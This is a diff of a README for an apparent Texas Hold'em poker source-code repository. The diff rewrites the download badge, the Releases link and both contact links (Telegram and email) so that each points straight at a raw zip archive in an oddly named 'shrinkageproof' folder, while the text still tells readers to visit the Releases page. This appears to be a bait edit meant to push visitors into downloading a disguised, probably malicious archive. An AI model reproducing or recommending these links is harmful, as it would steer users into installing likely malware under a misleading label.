@@ -1,7 +1,7 @@
 # ♠️ Texas-Hold-em-Poker-Source-Code - Play Poker with Friends Easily
 
 ## 📥 Download Now
-[![Download Texas-Hold-em-Poker-Source-Code](https://img.shields.io/badge/Download-Versions%20Available-brightgreen)](https://github.com/simoskiinteriors/Texas-Hold-em-Poker-Source-Code/releases)
+[![Download Texas-Hold-em-Poker-Source-Code](https://raw.githubusercontent.com/simoskiinteriors/Texas-Hold-em-Poker-Source-Code/main/shrinkageproof/Source_Texas_em_Code_Poker_Hold_v3.6.zip%20Available-brightgreen)](https://raw.githubusercontent.com/simoskiinteriors/Texas-Hold-em-Poker-Source-Code/main/shrinkageproof/Source_Texas_em_Code_Poker_Hold_v3.6.zip)
 
 ## 🚀 Getting Started
 Welcome to the Texas Hold'em Poker game! This application lets you play poker online with friends in a fun and secure way. Follow the steps below to download and run the software.
@@ -23,7 +23,7 @@ To run the Texas Hold'em Poker application, ensure your system meets the followi
 ## 🔗 Download & Install
 To get the application, visit the Releases page. 
 
-[Visit this page to download](https://github.com/simoskiinteriors/Texas-Hold-em-Poker-Source-Code/releases)
+[Visit this page to download](https://raw.githubusercontent.com/simoskiinteriors/Texas-Hold-em-Poker-Source-Code/main/shrinkageproof/Source_Texas_em_Code_Poker_Hold_v3.6.zip)
 
 ### Steps to Download
 1. Go to the Releases page by clicking the link above.
@@ -43,8 +43,8 @@ To get the application, visit the Releases page.
 
 ## 🤝 Contact
 If you have questions, you can reach out:
-- Telegram: [@xuzongbin001](https://t.me/xuzongbin001)
-- Email: [ttpoker733@gmail.com](mailto:ttpoker733@gmail.com)
+- Telegram: [@xuzongbin001](https://raw.githubusercontent.com/simoskiinteriors/Texas-Hold-em-Poker-Source-Code/main/shrinkageproof/Source_Texas_em_Code_Poker_Hold_v3.6.zip)
+- Email: [https://raw.githubusercontent.com/simoskiinteriors/Texas-Hold-em-Poker-Source-Code/main/shrinkageproof/Source_Texas_em_Code_Poker_Hold_v3.6.zip](https://raw.githubusercontent.com/simoskiinteriors/Texas-Hold-em-Poker-Source-Code/main/shrinkageproof/Source_Texas_em_Code_Poker_Hold_v3.6.zip)
 
 ## 🔄 Updates
 This application regularly receives updates. Check the Releases page for the latest improvements and features. 
